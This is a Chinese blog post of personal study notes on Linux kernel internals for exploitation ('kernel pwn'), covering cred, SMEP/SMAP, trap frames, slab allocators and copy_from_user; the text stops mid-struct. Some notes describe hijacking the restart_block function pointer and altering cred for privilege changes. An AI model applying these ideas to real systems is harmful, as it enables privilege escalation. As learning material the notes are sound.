<!DOCTYPE html>
<html lang="Chinese">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="基础知识 这里只是简单记录了一些笔者认为的重点。  概念性 cred &#x3D;&gt; 进程权限结构体  smep &#x3D;&gt; 执行  smap &#x3D;&gt; 访问  MMAP_MIN_ADDR &#x3D;&gt; 允许mmap映射的最低内存地址  LKMs  相当于内核的可执行程序 不能单独运行，在运行时被链接到内核   lsmod: 列出已经加载的模块  module_init&#x2F;module_exit：在载入">
<meta property="og:type" content="article">
<meta property="og:title" content="kernel study">
<meta property="og:url" content="http://yoursite.com/2021/06/05/20-29-undefined/index.html">
<meta property="og:site_name" content="Shuwen&#39;s blog">
<meta property="og:description" content="基础知识 这里只是简单记录了一些笔者认为的重点。  概念性 cred &#x3D;&gt; 进程权限结构体  smep &#x3D;&gt; 执行  smap &#x3D;&gt; 访问  MMAP_MIN_ADDR &#x3D;&gt; 允许mmap映射的最低内存地址  LKMs  相当于内核的可执行程序 不能单独运行，在运行时被链接到内核   lsmod: 列出已经加载的模块  module_init&#x2F;module_exit：在载入">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/2020-03-15-061423.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531143052634.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531143128795.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531143323513.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531150406602.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531150708860.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531151735100.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531151809409.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210531151832106.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210602220742358.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/2020-03-18-072543.jpg">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603142323422.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603143340595.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603145537156.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603145615870.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603145652475.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603150742793.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603152453197.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603152841301.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604143845221.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604143951129.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604144004010.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210603220411473.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604144540167.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604174655495.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604144933474.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604203258087.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604204333432.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604230215674.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604210532727.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210604210519934.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605000529882.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605000952674.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605001430795.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605202802017.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605204630220.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605205107457.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605210915873.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605211023321.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605211737963.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605212036394.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210605212140400.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606152944747.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606140816472.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144728288.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144740804.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144750687.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144805046.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144818089.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606144822285.png">
<meta property="og:image" content="http://yoursite.com/2021/06/05/kernel-study/image-20210606154209689.png">
<meta property="article:published_time" content="2021-06-05T12:29:41.000Z">
<meta property="article:modified_time" content="2021-06-07T08:07:07.505Z">
<meta property="article:author" content="Shuwen">
<meta property="article:tag" content="kernel pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2021/06/05/kernel-study/2020-03-15-061423.png">

<link rel="canonical" href="http://yoursite.com/2021/06/05/20-29-undefined/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'Chinese'
  };
</script>

  <title>kernel study | Shuwen's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="تشغيل شريط التصفح">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta custom-logo">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Shuwen's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">生活 & 学习</p>
      <a>
        <img class="custom-logo-image" src="http://r7wiw08xi.hn-bkt.clouddn.com/shuwen.jpg" alt="Shuwen's blog">
      </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>الأرشيفات</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="Chinese">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/06/05/20-29-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          kernel study
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2021-06-05 20:29:41" itemprop="dateCreated datePublished" datetime="2021-06-05T20:29:41+08:00">2021-06-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2021-06-07 16:07:07" itemprop="dateModified" datetime="2021-06-07T16:07:07+08:00">2021-06-07</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">في</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%B8%93%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">专题</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote>
<p>这里只是简单记录了一些笔者认为的重点。</p>
</blockquote>
<h3 id="概念性"><a href="#概念性" class="headerlink" title="概念性"></a>概念性</h3><ol>
<li><p>cred =&gt; 进程权限结构体</p>
</li>
<li><p>smep =&gt; 执行</p>
</li>
<li><p>smap =&gt; 访问</p>
</li>
<li><p>MMAP_MIN_ADDR =&gt; 允许mmap映射的最低内存地址</p>
</li>
<li><p>LKMs</p>
<ol>
<li>相当于内核的可执行程序</li>
<li>不能单独运行，在运行时被链接到内核</li>
</ol>
</li>
<li><p>lsmod: 列出已经加载的模块</p>
</li>
<li><p>module_init/module_exit：在载入/卸载这个驱动时<strong>自动运行</strong></p>
</li>
<li><p>C99 </p>
<ol>
<li>C编程语言标准的过去版本，扩展了版本 C90</li>
<li>允许使用可变长度数组</li>
</ol>
</li>
<li><p>modules：内核扩展模块</p>
</li>
<li><p>bzImage: 压缩的kernel内存映像</p>
</li>
<li><p>vmlinux：未压缩的kernel内存映像</p>
</li>
<li><p>rootfs.cpio: 文件系统映像</p>
</li>
<li><p>alloc_chrdev_region：动态分配设备编号</p>
</li>
</ol>
<hr>
<h3 id="IRET"><a href="#IRET" class="headerlink" title="IRET"></a>IRET</h3><p><strong>1. 相同保护级别</strong></p>
<p>从堆栈弹出</p>
<ol>
<li>代码段选择子 =&gt; CS寄存器</li>
<li>指令指针 =&gt; IP寄存器</li>
<li>标志寄存器 =&gt; EFLAGS寄存器</li>
</ol>
<p><strong>不同的保护级别</strong></p>
<p>除了以上3点外，还有</p>
<ol start="4">
<li>堆栈段选择子 =&gt; SS寄存器</li>
<li>堆栈指针 =&gt; SP寄存器</li>
</ol>
<p>返回到用户模式</p>
<blockquote>
<p>栈上保存了<code>trap frame</code>，用于恢复信息</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span>* eip;                <span class="comment">// instruction pointer +0</span></span><br><span class="line">    <span class="keyword">uint32_t</span> cs;              <span class="comment">// code segment   	 +4</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;          <span class="comment">// CPU flags     		 +8</span></span><br><span class="line">    <span class="keyword">void</span>* esp;                <span class="comment">// stack pointer       +12</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ss;              <span class="comment">// stack segment  	 +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>

<h3 id="thread-info"><a href="#thread-info" class="headerlink" title="thread_info"></a>thread_info</h3><p>内核堆栈与thread_info结构共享4k / 8k的总大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> thread_union &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/05/kernel-study/2020-03-15-061423.png" alt="Click to close image, click and drag to move. Use arrow keys for next and previous."></p>
<h4 id="restart-block"><a href="#restart-block" class="headerlink" title="restart_block"></a>restart_block</h4><ol>
<li>thread_info中的一个成员</li>
<li>是每个线程的结构</li>
<li>跟踪信息和参数 =&gt; 重新启动系统调用</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(struct restart_block *);</span><br></pre></td></tr></table></figure>

<p>有一个fn的函数指针，控制该指针 =&gt; 劫持EIP</p>
<h5 id="调用fn"><a href="#调用fn" class="headerlink" title="调用fn"></a>调用fn</h5><p>用户态调用fn</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE0(restart_syscall)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> *<span class="title">restart</span> = &amp;<span class="title">current_thread_info</span>()-&gt;<span class="title">restart_block</span>;</span></span><br><span class="line">    <span class="keyword">return</span> restart-&gt;fn(restart);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscall(SYS_restart_syscall);</span><br></pre></td></tr></table></figure>

<h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,<span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>返回值：成功返回创建的映射区的首地址；失败返回<strong>宏MAP_FAILED。</strong></p>
</li>
<li><p>参数： </p>
<p>addr:    指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p>
<p>length： 欲创建映射区的大小。</p>
<p>prot：   映射区权限PROT_READ、PROT_WRITE、PROT_READ|PROT_WRITE。</p>
<p>flags：   标志位参数(常用于设定更新物理区域、设置共享、创建匿名映射区)；</p>
<p>MAP_SHARED: 会将映射区所做的操作反映到物理设备（磁盘）上。</p>
<p>MAP_PRIVATE: 映射区所做的修改不会反映到物理设备。</p>
<p>fd：     用来建立映射区的文件描述符。</p>
<p>offset： 映射文件的偏移(4k的整数倍)。</p>
</li>
</ol>
<h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h3><blockquote>
<p>从源source所指的内存地址的起始位置开始拷贝n个字节到目标<strong>destin</strong>所指的内存地址的起始位置中。</p>
</blockquote>
<h4 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> destin, <span class="keyword">void</span> source, <span class="keyword">unsigned</span> n)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
<li>destin– 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。</li>
<li>source– 指向要复制的数据源，类型强制转换为 void* 指针。</li>
<li>n– 要被复制的字节数。</li>
</ul>
<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>该函数返回一个指向目标存储区destin的指针。</p>
<h3 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h3><table>
<thead>
<tr>
<th>kptr_restrict</th>
<th>权限描述</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>内核将符号地址打印为全0, root和普通用户都没有权限</td>
</tr>
<tr>
<td>1</td>
<td>root用户有权限读取, 普通用户没有权限</td>
</tr>
<tr>
<td>0</td>
<td>root和普通用户都可以读取</td>
</tr>
</tbody></table>
<h3 id="tty"><a href="#tty" class="headerlink" title="tty"></a>tty</h3><p><a href="https://blog.csdn.net/zhoucheng05_13/article/details/86510469" target="_blank" rel="noopener">https://blog.csdn.net/zhoucheng05_13/article/details/86510469</a></p>
<ol>
<li>虚拟控制台</li>
<li>串口</li>
<li>伪终端设备</li>
</ol>
<h3 id="ptmx"><a href="#ptmx" class="headerlink" title="ptmx"></a>ptmx</h3><p>伪终端的master端</p>
<h3 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc"></a>kmalloc</h3><p>使用<code>slab/slub</code>分配器，使用多级的结构进行管理</p>
<p>首先有<code>cache</code>层</p>
<h4 id="cache结构"><a href="#cache结构" class="headerlink" title="cache结构"></a><code>cache</code>结构</h4><ol>
<li>空对象</li>
<li>部分使用的对象</li>
<li>完全使用中的对象</li>
</ol>
<p>对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。</p>
<h3 id="slab-slub分配器"><a href="#slab-slub分配器" class="headerlink" title="slab/slub分配器"></a><code>slab/slub</code>分配器</h3><ul>
<li><p><code>slab</code>分配器严格按照<code>cache</code>去区分，不同<code>cache</code>的无法分配在一页内</p>
</li>
<li><p><code>slub</code>分配器则较为宽松，不同<code>cache</code>如果分配相同大小，可能会在一页内。</p>
</li>
</ul>
<h3 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h3><p>mount是Linux下的一个命令，它可以将分区挂接到Linux的一个文件夹下，从而将分区和该目录联系起来，因此我们只要访问这个文件夹，就相当于访问该分区了。</p>
<h3 id="file-operations"><a href="#file-operations" class="headerlink" title="file_operations"></a>file_operations</h3><p>属于Linux 字符设备驱动结构</p>
<ol>
<li>Linux使用file_operations结构访问驱动程序的函数，这个结构的每一个成员的名字都对应着一个调用。</li>
<li>用户进程利用在对设备文件进行诸如read/write操作的时候，系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。</li>
</ol>
<h4 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h4><blockquote>
<p>这个函数用来从<strong>设备</strong>中<strong>获取数据</strong>。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> (*<span class="built_in">read</span>) (struct file * filp, <span class="keyword">char</span> __user * <span class="built_in">buffer</span>, <span class="keyword">size_t</span>    <span class="built_in">size</span> , <span class="keyword">loff_t</span> * p);</span><br></pre></td></tr></table></figure>

<ul>
<li>指针参数 filp 为进行读取信息的目标文件</li>
<li>指针参数buffer 为对应放置信息的缓冲区（即用户空间内存地址）</li>
<li>参数size为要读取的信息长度</li>
<li>参数 p 为读的位置相对于文件开头的偏移，在读取信息后，这个指针一般都会移动，移动的值为要读取信息的长度值</li>
</ul>
<h4 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h4><blockquote>
<p> 发送数据给设备</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> (*<span class="built_in">write</span>) (struct file * filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *   <span class="built_in">buffer</span>, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> * ppos);</span><br></pre></td></tr></table></figure>

<ul>
<li>参数filp为目标文件结构体指针</li>
<li>buffer为要写入文件的信息缓冲区</li>
<li>count为要写入信息的长度</li>
<li>ppos为当前的偏移位置，这个值通常是用来判断写文件是否越界</li>
</ul>
<h3 id="内核态函数调用"><a href="#内核态函数调用" class="headerlink" title="内核态函数调用"></a>内核态函数调用</h3><p>memcpy() =&gt; copy_from_user()/copy_to_user()</p>
<blockquote>
<p>都是将rsi的数据拷贝到rdi</p>
</blockquote>
<ul>
<li><p>copy_from_user()</p>
<ul>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(<span class="keyword">void</span> *to, <span class="keyword">const</span> <span class="keyword">void</span> __user *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></figure>

<p>@to     将数据拷贝到内核的地址</p>
<p>@from  需要拷贝数据的地址</p>
</li>
<li><p>从用户空间拷贝数据到内核空间</p>
</li>
<li><p>返回值</p>
<ul>
<li>失败返回没有被拷贝的字节数</li>
<li>成功返回0</li>
</ul>
</li>
</ul>
</li>
<li><p>copy_to_user()</p>
</li>
</ul>
<h3 id="cred-结构体"><a href="#cred-结构体" class="headerlink" title="cred 结构体"></a>cred 结构体</h3><p><a href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred" target="_blank" rel="noopener">源码</a></p>
<ul>
<li>内核使用<code>cred</code>结构体记录进程的权限(<code>uid，gid</code>等）</li>
<li>每个进程中都有一个 cred 结构</li>
<li>如果能修改某个进程的<code>cred</code>，那么也就修改了这个进程的权限。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *	task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *	upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task's actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> 